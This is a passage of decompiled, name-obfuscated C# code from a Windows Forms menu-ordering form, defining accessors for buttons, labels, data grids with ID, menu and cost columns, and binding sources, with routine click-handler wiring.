		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (w = b8L);
		val = w;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button n6G()
	{
		return _BtnErase;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ec0(Button y5B)
	{
		EventHandler eventHandler = t5E;
		Button btnErase = _BtnErase;
		if (btnErase != null)
		{
			((Control)btnErase).remove_Click(eventHandler);
		}
		_BtnErase = y5B;
		btnErase = _BtnErase;
		if (btnErase != null)
		{
			((Control)btnErase).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Ta1()
	{
		return _BtnSubmit;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Yz6(Button Mc4)
	{
		EventHandler eventHandler = z7G;
		Button btnSubmit = _BtnSubmit;
		if (btnSubmit != null)
		{
			((Control)btnSubmit).remove_Click(eventHandler);
		}
		_BtnSubmit = Mc4;
		btnSubmit = _BtnSubmit;
		if (btnSubmit != null)
		{
			((Control)btnSubmit).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TextBox Wk2()
	{
		return _TxtName;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void k9P(TextBox g6M)
	{
		_TxtName = g6M;
	}

	[SpecialName]
	internal virtual Label Yw8()
	{
		return t;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void c3X(Label b3M)
	{
		Label val = (t = b3M);
	}

	[SpecialName]
	internal virtual Label Fg7()
	{
		return P;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void o4C(Label t9C)
	{
		Label val = (P = t9C);
	}

	[SpecialName]
	internal virtual Label So2()
	{
		return _Label3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void r3H(Label Dc2)
	{
		_Label3 = Dc2;
	}

	[SpecialName]
	internal virtual DataGridView Lb5()
	{
		return _MenuDataGridView;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Hg8(DataGridView Pm0)
	{
		_MenuDataGridView = Pm0;
	}

	[SpecialName]
	internal virtual DataGridView Ci7()
	{
		return _MenuDataGridView1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Gq4(DataGridView t9Z)
	{
		_MenuDataGridView1 = t9Z;
	}

	[SpecialName]
	internal virtual BindingSource g2Q()
	{
		return O;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ac1(BindingSource Gc0)
	{
		BindingSource val = (O = Gc0);
	}

	[SpecialName]
	internal virtual Si0 Xw9()
	{
		return l;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void b2X(Si0 t4T)
	{
		Si0 si = (l = t4T);
	}

	[SpecialName]
	internal virtual BindingSource g2P()
	{
		return _MenuBindingSource;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void p4T(BindingSource Me2)
	{
		_MenuBindingSource = Me2;
	}

	[SpecialName]
	internal virtual x6H g1L()
	{
		return _MenuTableAdapter;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Jz7(x6H i1T)
	{
		_MenuTableAdapter = i1T;
	}

	[SpecialName]
	internal virtual BindingSource Qe1()
	{
		return U;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void i2S(BindingSource y2R)
	{
		BindingSource val = (U = y2R);
	}

	[SpecialName]
	internal virtual Md1 i0K()
	{
		return J;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void b3F(Md1 p7E)
	{
		Md1 md = (J = p7E);
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn m9W()
	{
		return _IDDataGridViewTextBoxColumn;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void e6Z(DataGridViewTextBoxColumn m9Z)
	{
		_IDDataGridViewTextBoxColumn = m9Z;
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn w7Z()
	{
		return _MenuDataGridViewTextBoxColumn;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void s4N(DataGridViewTextBoxColumn i8W)
	{
		_MenuDataGridViewTextBoxColumn = i8W;
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn p5L()
	{
		return _CostDataGridViewTextBoxColumn;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void w6H(DataGridViewTextBoxColumn Ys0)
	{
		_CostDataGridViewTextBoxColumn = Ys0;
	}

	[SpecialName]
	internal virtual DataGridViewCheckBoxColumn Nd3()
	{
		return I;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Cx5(DataGridViewCheckBoxColumn t9S)
	{
		DataGridViewCheckBoxColumn val = (I = t9S);
	}

	[SpecialName]
	internal virtual Button Lx4()
	{
		return _btnclear;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Zi0(Button Wq5)
	{
		EventHandler eventHandler = Mw4;
		Button btnclear = _btnclear;
		if (btnclear != null)
		{
			((Control)btnclear).remove_Click(eventHandler);
		}
		_btnclear = Wq5;
		btnclear = _btnclear;
		if (btnclear != null)
		{
			((Control)btnclear).add_Click(eventHandler);
		}
	}
}
